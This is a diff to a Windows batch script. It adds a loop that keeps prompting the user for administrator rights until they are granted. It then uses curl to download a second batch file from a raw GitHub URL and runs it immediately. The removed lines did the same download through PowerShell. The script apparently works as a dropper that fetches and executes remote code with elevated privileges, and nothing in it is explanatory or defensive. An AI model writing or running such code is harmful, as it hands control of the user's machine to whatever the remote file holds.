@@ -2,20 +2,43 @@
 
 
 
-::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
 
+:: Check Admin Privileges
+net session >nul 2>&1
+if %errorlevel% equ 0 (
+:: Admin Granted
+goto RUNADMINHERE
+) else (
+:: Admini Not Granted
+goto loop
+)
+
+
+:loop
+:: Requesting Admin Privileges...
+powershell -Command "Start-Process '%~f0' -Verb RunAs"
+
+if %errorlevel% equ 0 (
+ :: Admin Granted
+goto exit
+) else ( 
+:: ( Admin Not Granted )
+    goto loop
+)
+
+:RUNADMINHERE
+:: Run All your commands here ( will be executed with admin privileges )
 
 
 
 color 0A
 setlocal enabledelayedexpansion
-set "embeddedScript=temp_script_RUNEVERY.bat"
-
-
+set "embeddedScript=temp_script_RUNEVERYCALLER.bat"
 
 :RUNEVERYCALLER
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RunEvery') | Out-File -Encoding ASCII '%embeddedScript%'"
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Callers/RunEveryCaller"
+
 
 if exist "%embeddedScript%" (
     call "%embeddedScript%"
